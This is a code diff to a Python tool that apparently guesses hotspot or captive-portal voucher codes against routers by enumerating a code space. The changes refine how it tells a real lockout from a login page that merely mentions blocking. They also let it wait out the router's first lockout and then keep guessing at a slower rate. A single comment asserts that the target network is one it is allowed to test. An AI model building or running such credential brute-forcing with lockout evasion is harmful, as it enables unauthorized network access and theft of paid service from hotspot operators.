@@ -22,7 +22,7 @@ import threading
 import time
 from collections import Counter, deque
 
-from . import config, verify
+from . import config, portals, verify
 from .errors import classify
 from .fingerprint import Fingerprinter, Judge, Verdict, find_phrase
 from .httpclient import Session
@@ -191,21 +191,32 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
             return cal
         ms = (time.time() - t0) * 1000
         p["login_url"] = resp.url or p["login_url"]
-        cal.step("reach_login_page", True, "http_ok",
-                 {"status": resp.status, "ms": round(ms),
-                  "final_url": p["login_url"]})
 
         # --- 1b. is the door already shut? --------------------------------
-        # If the login page itself is a block page, sending the test cards
-        # would only add failures to a counter that is already full - and on a
-        # router that locks after two of them, it makes things worse.
+        # A page that still offers the login form is NOT a block page, even
+        # when it mentions blocking somewhere ("... is banned" in a footnote,
+        # "slow down" in a warning) - calling that a block used to stop every
+        # run on networks that were perfectly reachable.  A real block page
+        # replaces the form.
         page_word = find_phrase((resp.text or "").lower(), config.BAN_WORDS)
-        if resp.status in (403, 429) or page_word:
+        # note: parse_form() always *names* a user field (it falls back to
+        # "username"), so the honest question is whether it FOUND inputs
+        has_form = bool(portals.parse_form(resp.text or "",
+                                           p["login_url"]).inputs)
+        if resp.status in (403, 429) or (page_word and not has_form):
             cal.error = "blocked_already"
             cal.step("reach_login_page", False, "blocked_before_probes",
                      {"status": resp.status, "word": page_word,
+                      "has_form": has_form,
                       "advice": "reconnect_or_restart_router"})
             return cal
+        cal.step("reach_login_page", True,
+                 "http_ok_word_ignored" if page_word else "http_ok",
+                 {"status": resp.status, "ms": round(ms),
+                  "final_url": p["login_url"],
+                  "word": page_word,
+                  "note": "the page still offers the login form, so the block "
+                          "word in its text was ignored" if page_word else ""})
 
         # --- 2. is the guest online, walled or offline? -----------------
         cal.internet = verify.probe_internet(session, checks=checks)
@@ -243,12 +254,17 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
         # before we even start.  A bare 503 is only a busy router/RADIUS, so it
         # is NOT treated as a block here - the run just slows down on it.
         block_status = [s.status for s in replies if s.status in (403, 429)]
-        block_word = ""
+        block_word, block_form = "", False
         for r in replies:
             block_word = find_phrase((r.text or "").lower(), config.BAN_WORDS)
             if block_word:
+                # same rule as above: a reply that still carries the login
+                # form is a rejection page that happens to warn about
+                # blocking, not the router locking us out
+                block_form = bool(portals.parse_form(r.text or "",
+                                                     p["login_url"]).inputs)
                 break
-        if block_status or block_word:
+        if block_status or (block_word and not block_form):
             # The login page was fine a moment ago and the router locked us
             # after the test cards: that is OUR lockout (it usually expires),
             # not a router that refuses this device since before.
@@ -256,7 +272,7 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
             cal.step("rejection_baseline", False, "blocked_by_our_probes",
                      {"advice": "wait_then_retry_with_fewer_probes",
                       "status": block_status[:3], "word": block_word,
-                      "probes_sent": len(replies),
+                      "has_form": block_form, "probes_sent": len(replies),
                       "wait_seconds": config.BLOCK_WAIT_SECONDS})
             return cal
 
@@ -580,6 +596,8 @@ class Engine:
         self._last_event_at = 0.0
         self._clean_streak = 0
         self._ban_count = 0
+        self._pause_until = 0.0     # "the router asked us to wait"
+        self._banned_once = False   # we wait a lockout out exactly once
         self._rate_count = 0
         self._unknown_saved = 0
         self._rejected_since_emit = 0
@@ -685,6 +703,8 @@ class Engine:
         self.throttle.update({"delay_ms": int(delay_ms), "base_ms": int(delay_ms),
                               "reason": "", "events": []})
         self._ban_count = self._rate_count = self._unknown_saved = 0
+        self._pause_until = 0.0
+        self._banned_once = False
         self._clean_streak = 0
         space = store.space_size(p)
         pos = max(0, int(p.get("space_pos", 0)))
@@ -895,6 +915,9 @@ class Engine:
 
     # -- one attempt -----------------------------------------------------
     def _attempt(self, sess, judge, card: str, sent_index: int) -> None:
+        self._wait_pause()
+        if self.stop_event.is_set():
+            return
         sess.read_timeout = config.ATTACK_READ_TIMEOUT
         delay = self.throttle["delay_ms"] / 1000.0
         if delay > 0:
@@ -1104,6 +1127,13 @@ class Engine:
             self.throttle["reason"] = "recovering_speed" if new > base else ""
         self.emit("throttle", {"reason": "recovering_speed", "delay_ms": new})
 
+    def _wait_pause(self) -> None:
+        """Sit still while the router's lockout runs out."""
+        while not self.stop_event.is_set():
+            if time.time() >= getattr(self, "_pause_until", 0):
+                return
+            time.sleep(0.3)
+
     def _check_stop_rules(self) -> None:
         """Stop only for reasons we can explain."""
         counters = self.counters
@@ -1111,6 +1141,23 @@ class Engine:
         attempts = sum(counters.values())
         if errors >= config.BURST_LIMIT and errors >= attempts * 0.8:
             self.stop("target_unreachable")
+        if self._ban_count >= 3 and not self._banned_once:
+            # The router locked us out.  On a network we are allowed to test
+            # the lockout is temporary, so we sit through it ONCE and then go
+            # on slowly - hammering a router that is asking us to slow down
+            # only makes the next lockout longer.
+            self._banned_once = True
+            self._ban_count = 0
+            self._pause_until = time.time() + config.BLOCK_WAIT_SECONDS
+            with self.lock:
+                self.throttle["delay_ms"] = max(
+                    self.throttle["delay_ms"], config.BAN_COOLDOWN_MS)
+                self.throttle["reason"] = "banned_waiting"
+            self.emit("block_wait", {"seconds": config.BLOCK_WAIT_SECONDS,
+                                     "cause": "router_lockout"})
+            self.emit("throttle", {"reason": "banned_waiting",
+                                   "delay_ms": self.throttle["delay_ms"]})
+            return
         if self._ban_count >= 3:
             self.stop("banned_by_router")
         if self._rate_count >= 5:
